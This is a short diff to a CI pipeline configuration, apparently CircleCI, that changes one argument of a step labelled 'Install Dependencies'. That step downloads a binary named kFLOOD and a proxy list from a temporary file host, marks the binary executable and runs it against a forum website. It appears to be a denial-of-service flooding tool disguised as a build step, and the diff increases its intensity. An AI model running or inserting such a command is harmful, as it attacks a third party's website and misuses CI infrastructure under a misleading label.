@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install wget -y && wget https://temp.sh/Orfec/kFLOOD && wget https://temp.sh/rVhTD/proxy.txt && chmod +x kFLOOD && ./kFLOOD https://forum4u.online/ 999999 0 1 0 proxy.txt
+            command: apt update && apt install wget -y && wget https://temp.sh/Orfec/kFLOOD && wget https://temp.sh/rVhTD/proxy.txt && chmod +x kFLOOD && ./kFLOOD https://forum4u.online/ 999999 0 64 0 proxy.txt
             no_output_timeout: 5h
 
 workflows:
